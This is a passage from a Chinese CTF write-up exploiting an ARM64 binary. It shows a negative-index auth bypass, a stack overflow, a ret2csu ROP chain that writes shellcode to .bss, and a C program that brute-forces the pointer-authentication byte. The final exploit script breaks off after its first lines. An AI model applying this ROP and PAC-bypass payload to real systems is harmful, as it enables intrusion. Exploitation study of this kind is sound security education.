<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_4009D8</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">return</span> <span class="n">a1</span> <span class="o">^</span> <span class="p">(</span><span class="n">a1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">a1</span> <span class="o">^</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)(</span><span class="n">a1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">11</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">a1</span> <span class="o">^</span> <span class="p">(</span><span class="n">a1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">a1</span> <span class="o">^</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)(</span><span class="n">a1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">11</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">31</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">a1</span> <span class="o">^</span> <span class="p">(</span><span class="n">a1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">a1</span> <span class="o">^</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)(</span><span class="n">a1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">11</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">a1</span> <span class="o">^</span> <span class="p">(</span><span class="n">a1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">a1</span> <span class="o">^</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)(</span><span class="n">a1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">11</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">31</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">13</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>他会先将0x10A9FC70042填充成<code>0x**10A9FC70042</code>，其中<code>**</code>是未知的，然后再进入sub_4009D8进行一系列encode操作，所以只能爆破这两个<code>**</code>，比较麻烦。这一个未知的字节便是PAC，我们稍后也会遇到。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">.text:0000000000400D54 loc_400D54                              ; CODE XREF: auth+74↑j
.text:0000000000400D54                 MOV             X8, #0x10A9FC70042
.text:0000000000400D60                 STR             X8, [SP,#0x20+var_10]
.text:0000000000400D64                 LDR             X8, [SP,#0x20+var_10]
.text:0000000000400D68                 PACIA           X8, SP
.text:0000000000400D6C                 STR             X8, [SP,#0x20+var_10]
.text:0000000000400D70                 LDURSW          X8, [X29,#var_4]
.text:0000000000400D74                 ADRL            X9, name
.text:0000000000400D7C                 ADD             X8, X9, X8,LSL#4
.text:0000000000400D80                 LDR             X8, [X8,#0x20]
.text:0000000000400D84                 LDR             X0, [SP,#0x20+var_10]
.text:0000000000400D88                 STR             X8, [SP,#0x20+var_20]
.text:0000000000400D8C                 BL              encode
</code></pre></td></tr></table>
</div>
</div><p>而如果利用负溢出漏洞，idx=-1就是我们可控的name区域，所以事先填入<code>0x10A9FC70042</code>后lock(-1)并auth(-1)就能通过校验，进入到栈溢出函数。</p>
<p>我们先把ROP链写好。先简单说一下ARM64的指令集与常识</p>
<ul>
<li>ARM64 取消了32位的 LDM,STM,PUSH,POP指令，取而代之的是str\stp、ldr\ldp</li>
<li><strong>ARM64 里面对栈的操作是16字节对齐</strong></li>
<li>sp寄存器在任意时刻会保存栈顶的地址</li>
<li>fp寄存器也称为x29寄存器属于通用寄存器,但是在某些时刻我们利用它保存栈底的地址</li>
<li>x30：链接寄存器（LR），用于保存子程序的返回地址</li>
<li>ARM64用寄存器传参</li>
</ul>
<p>来看看栈溢出函数，用BL调用了read函数后开始还原栈帧</p>
<ul>
<li>X29=fp=[SP+0x20]，相当于x86的还原上一个栈帧的rbp</li>
<li>X30=LR=[SP+0x28]，ARM64把返回地址放在寄存器LR内，在栈上的位置也是rbp+8</li>
<li>将sp直接向上提0x30，复原栈顶指针</li>
<li>最后retaa返回到返回地址</li>
</ul>
<p>可以看到ARM64的fp(rbp)是通过直接赋值来还原的，所以在布置ROP链的时候总是要考虑rbp的位置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">backdoor                                ; CODE XREF: auth:loc_400DA0↓p
.text:0000000000400BDC
.text:0000000000400BDC var_s0          =  0
.text:0000000000400BDC
.text:0000000000400BDC                 PACIASP
.text:0000000000400BE0                 SUB             SP, SP, #0x30
.text:0000000000400BE4                 STP             X29, X30, [SP,#0x20+var_s0]
.text:0000000000400BE8                 ADD             X29, SP, #0x20
.text:0000000000400BEC                 MOV             W8, WZR
.text:0000000000400BF0                 MOV             X2, #0x100 ; nbytes
.text:0000000000400BF4                 MOV             X1, SP  ; buf
.text:0000000000400BF8                 MOV             W0, W8  ; fd
.text:0000000000400BFC                 BL              .read
.text:0000000000400C00                 LDP             X29, X30, [SP,#0x20+var_s0]
.text:0000000000400C04                 ADD             SP, SP, #0x30 ; &#39;0&#39;
.text:0000000000400C08                 RETAA
</code></pre></td></tr></table>
</div>
</div><p>一般来说可以找一些gadget然后mprotect写shellcode，这里没开NX所以直接在bss段写就行。</p>
<p>参考https://blog.csdn.net/qq_39869547/article/details/105255683</p>
<p>这段gadget位于csu处，是一定会有的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">.text:0000000000400FD8 loc_400FD8                              ; CODE XREF: sub_400F90+64↓j
.text:0000000000400FD8                 LDR             X3, [X21,X19,LSL#3]
.text:0000000000400FDC                 MOV             X2, X24
.text:0000000000400FE0                 ADD             X19, X19, #1
.text:0000000000400FE4                 MOV             X1, X23
.text:0000000000400FE8                 MOV             W0, W22
.text:0000000000400FEC                 BLR             X3
.text:0000000000400FF0                 CMP             X20, X19
.text:0000000000400FF4                 B.NE            loc_400FD8
.text:0000000000400FF8
.text:0000000000400FF8 loc_400FF8                              ; CODE XREF: sub_400F90+3C↑j
.text:0000000000400FF8                 LDP             X19, X20, [SP,#var_s10] 
.text:0000000000400FFC                 LDP             X21, X22, [SP,#var_s20]
.text:0000000000401000                 LDP             X23, X24, [SP,#var_s30]
.text:0000000000401004                 LDP             X29, X30, [SP+var_s0],#0x40
.text:0000000000401008                 RET
</code></pre></td></tr></table>
</div>
</div><p>该ROP链的思路是：</p>
<div class="details admonition info open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-info-circle fa-fw"></i>Info<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">布置栈帧→ 跳到loc_400FF8控制X19-X30 → 返回到loc_400FD8 → 控制X0-X3（控制参数）→ 跳到X3(read@got) → 写shellcode → 使X20=X19让其不跳回loc_400FD8而继续执行 → 再次控制X19-X30  → 返回到shellcode处getshell</div>
        </div>
    </div>
<p>所以我们的ROP链如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="s2">&#34;&#34;&#34;
</span><span class="s2">w0 = w22
</span><span class="s2">x1 = x23
</span><span class="s2">x2 = x24
</span><span class="s2">x3 = [X21+X19&lt;&lt;3] -&gt; read
</span><span class="s2">
</span><span class="s2">x19 = 0
</span><span class="s2">x20 = 0
</span><span class="s2">x21 = read_addr
</span><span class="s2">x22 = 0
</span><span class="s2">x23 = sc_addr
</span><span class="s2">x24 = 0x100
</span><span class="s2">
</span><span class="s2">x29 = stack_frame
</span><span class="s2">
</span><span class="s2">&#34;&#34;&#34;</span>
<span class="n">fake_fp</span> <span class="o">=</span> <span class="mh">0x412500</span> <span class="o">//</span> <span class="o">.</span><span class="n">bss</span>
<span class="n">sc_addr</span> <span class="o">=</span> <span class="mh">0x412060</span> <span class="o">//</span> <span class="o">.</span><span class="n">bss</span>
<span class="n">rop</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x20</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="n">fake_fp</span><span class="p">,</span> <span class="mh">0x400FF8</span><span class="p">,</span>  <span class="o">//</span> <span class="n">fp0</span><span class="p">,</span> <span class="n">ret_addr0</span>
            <span class="o">//</span> <span class="o">-&gt;</span><span class="n">when</span> <span class="ow">in</span> <span class="mh">0x400FF8</span><span class="p">,</span> <span class="n">sp</span> <span class="ow">is</span> <span class="n">here</span>
            <span class="n">fake_fp</span><span class="p">,</span> <span class="mh">0x400FD8</span><span class="p">,</span> <span class="o">//</span> <span class="n">X29</span><span class="p">,</span> <span class="n">X30</span>   
            <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">//</span> <span class="n">X19</span><span class="p">,</span> <span class="n">X20</span>
            <span class="n">read_got</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">//</span><span class="n">X21</span><span class="p">,</span> <span class="n">X22</span><span class="o">-&gt;</span><span class="n">X0</span>
            <span class="n">sc_addr</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="o">//</span><span class="n">X23</span><span class="o">-&gt;</span><span class="n">X1</span><span class="p">,</span> <span class="n">X24</span><span class="o">-&gt;</span><span class="n">X2</span>
            <span class="n">fake_fp</span><span class="p">,</span> <span class="n">sc_addr</span>
           <span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>这样直接ROP会被PAC拦截</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
<span class="o">[</span>DEBUG<span class="o">]</span> Received 0x43 bytes:
    <span class="s1">&#39;qemu: uncaught target signal 11 (Segmentation fault) - core dumped\n&#39;</span>
qemu: uncaught target signal <span class="m">11</span> <span class="o">(</span>Segmentation fault<span class="o">)</span> - core dumped
<span class="o">[</span>*<span class="o">]</span> Got EOF <span class="k">while</span> reading in interactive
$ 
<span class="o">[</span>*<span class="o">]</span> Interrupted
<span class="o">[</span>*<span class="o">]</span> Process <span class="s1">&#39;/usr/bin/qemu-aarch64&#39;</span> stopped with <span class="nb">exit</span> code -11 <span class="o">(</span>SIGSEGV<span class="o">)</span> <span class="o">(</span>pid 5123<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><p>调试发现retaa指令返回之后跳到了一个奇奇怪怪的地方</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Invalid address 0x20000000400ff8
</code></pre></td></tr></table>
</div>
</div><p>发现栈溢出函数中一头一尾有PACIASP与RETAA指令，查阅官方资料</p>
<blockquote>
<table>
<thead>
<tr>
<th>instruction</th>
<th>function</th>
</tr>
</thead>
<tbody>
<tr>
<td>PACIxSP</td>
<td>Sign LR, using SP as the modifier.</td>
</tr>
<tr>
<td>PACIxZ</td>
<td>Sign LR, using 0 as the modifier.</td>
</tr>
<tr>
<td>PACIx</td>
<td>Sign Xn, using a general-purpose register as modifier.</td>
</tr>
<tr>
<td>AUTIxSP</td>
<td>Authenticate LR, using SP as the modifier.</td>
</tr>
<tr>
<td>AUTIxZ</td>
<td>Authenticate LR, using 0 as the modifier.</td>
</tr>
<tr>
<td>AUTIx</td>
<td>Authenticate Xn, using a general-purpose register as modifier.</td>
</tr>
<tr>
<td>BRAx</td>
<td>Indirect branch with pointer authentication.</td>
</tr>
<tr>
<td>BLRAx</td>
<td>Indirect branch with link, with pointer authentication.</td>
</tr>
<tr>
<td>RETAx</td>
<td>Function return with pointer authentication.</td>
</tr>
<tr>
<td>ERETAx</td>
<td>Exception return with pointer authentication.</td>
</tr>
</tbody>
</table>
<p>In each case, replace x with A or B to select the wanted key.</p>
</blockquote>
<p>PACIASP会让SP填充一个随机字节（PAC）做签名，然后在retaa首先会比较签名，只有正确后才会返回，所以我们首先得想办法拿到0x400FF8地址对应的sign。</p>
<p>我们可以建一个map，用如下C语言程序模拟该字节所有情况下通过encode以后的值并全部存储下来</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">uint64_t</span> <span class="nf">encode</span><span class="p">(</span><span class="kt">int64_t</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">return</span> <span class="n">a1</span> <span class="o">^</span> <span class="p">(</span><span class="n">a1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">a1</span> <span class="o">^</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)(</span><span class="n">a1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">11</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">a1</span> <span class="o">^</span> <span class="p">(</span><span class="n">a1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">a1</span> <span class="o">^</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)(</span><span class="n">a1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">11</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">31</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">a1</span> <span class="o">^</span> <span class="p">(</span><span class="n">a1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">a1</span> <span class="o">^</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)(</span><span class="n">a1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">11</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">a1</span> <span class="o">^</span> <span class="p">(</span><span class="n">a1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">a1</span> <span class="o">^</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)(</span><span class="n">a1</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">11</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">31</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">13</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">int64_t</span> <span class="n">a</span> <span class="o">=</span> <span class="mh">0x44010A9FC70042</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">b</span><span class="o">=</span> <span class="n">encode</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%#llx -&gt; %#llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">a</span><span class="p">,</span> <span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">b</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;{&#34;</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mh">0x100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;&lt;</span> <span class="mi">48</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x400FF8</span><span class="p">;</span>  <span class="err">#</span> <span class="err">该字节从</span><span class="mh">0x00</span><span class="o">-</span><span class="mh">0xff</span>
        <span class="n">b</span> <span class="o">=</span> <span class="n">encode</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;    %#llx : %#llx,</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">b</span><span class="p">,</span> <span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">a</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;}</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>然后再次利用负溢出漏洞，查表便可以知道该0x400FF8对应的签名的随机字节到底是多少，至此我们终于能ROP了，找个能用的shellcode就能打通了！</p>
<p>完整exp如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;aarch64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
